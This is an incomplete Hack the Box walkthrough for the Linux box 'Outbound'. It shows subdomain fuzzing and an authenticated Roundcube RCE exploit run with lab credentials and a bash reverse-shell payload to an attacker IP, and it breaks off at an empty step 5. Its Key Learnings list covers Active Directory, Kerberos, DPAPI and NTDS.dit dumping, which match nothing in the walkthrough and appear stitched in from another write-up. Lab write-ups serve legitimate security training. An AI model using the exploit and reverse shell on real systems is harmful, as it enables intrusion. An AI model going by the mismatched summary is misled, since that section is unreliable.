# Outbound

**Platform: Hack the Box**

**OS: Linux**

**Diffculty: Easy**


## Table of Contents
- [Key Learnings](#key-learnings)
- [Walkthrough](#walkthrough)
- [Remediation Summary](#remediation-summary)


## Key Learnings
- Familiarize using tools without NTLM authentication. Use tools with only Kerberos authentication
- Learn more about Kerberos authentication on Active Directory
- Learn about Active Directory Recycle bin and the deleting object process with it enabled
- Enumerate and restore deleted user with bloodyAD
- Decrypt DPAPI keys with Impacket's Dpapi.py
- Exfiltrate NTDS.dit and the SYSTEM registry hive and obtain domain hashes with secretsdump


## **Disclaimer: Potential spoilers below**


## Walkthrough

1. Run nmap scan

<img width="711" height="290" alt="image" src="https://github.com/user-attachments/assets/5b58b511-79f5-47c5-a6c1-a3365116cf5f" />


2. Nmap shows only SSH and HTTP ports open. Visiting the website automatically redirects us to a mail server at mail.outbound.htb. Enumerate subdomains and do dirbusting.

`ffuf -u http://mail.outbound.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs 5327`

<img width="696" height="101" alt="image" src="https://github.com/user-attachments/assets/4b6a549c-2b17-4407-aee3-6d91385cbe58" />

3. Found a roundcube webmail server! 

<img width="463" height="404" alt="image" src="https://github.com/user-attachments/assets/c35646fa-5f2e-44ae-87d3-78f3330a4e40" />

4. Googling for Roundcube exploits, we find a PHP Authenticated Remote Code Execution script. Running the script, we confirm we have RCE on the target machine and get a reverse shell

`sudo php /opt/CVE-2025-49113-Roundcube-Authenticated-RCE.php http://mail.outbound.htb/roundcube/ tyler LhKL1o9Nm3X2 'bash -c "bash -i >& /dev/tcp/10.10.14.176/80 0>&1"'`

<img width="847" height="150" alt="image" src="https://github.com/user-attachments/assets/611d0c33-3fb8-41c2-8fed-9c8a5ca30760" />

<img width="637" height="169" alt="image" src="https://github.com/user-attachments/assets/822e624f-cc42-4d67-8415-33b84a40c459" />

5. 

